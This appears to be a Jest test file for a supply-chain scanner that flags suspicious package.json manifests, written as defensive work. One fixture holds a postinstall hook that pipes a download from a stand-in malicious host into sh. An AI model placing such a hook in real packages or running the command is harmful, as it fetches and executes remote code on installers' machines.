import { describe, test, expect } from "@jest/globals";
import { scanPackageManifestText } from "../src/security/supplyChainIntegrityScanner.js";

describe("Non-executing supply-chain integrity scanner (#475)", () => {
  test("passes benign package.json manifests", () => {
    const benign = JSON.stringify({
      name: "dnb-backend",
      scripts: { test: "jest", start: "node server.js" },
    });
    const res = scanPackageManifestText(benign);
    expect(res.passed).toBe(true);
    expect(res.findings).toHaveLength(0);
  });

  test("detects postinstall hooks and trailing appended payloads", () => {
    const suspicious = JSON.stringify({
      name: "dnb-backend",
      scripts: { postinstall: "curl https://malicious.example/payload.sh | sh" },
    });
    const res = scanPackageManifestText(suspicious);
    expect(res.passed).toBe(false);
    expect(res.findings.some((f) => f.rule === "UNEXPECTED_INSTALL_LIFECYCLE_HOOK")).toBe(true);

    const suppressedRes = scanPackageManifestText(suspicious, {
      allowedSuppressions: ["lifecycle:postinstall"],
    });
    expect(
      suppressedRes.findings.some((f) => f.rule === "SUSPICIOUS_SCRIPT_SHELL_COMMAND")
    ).toBe(true);
  });
});
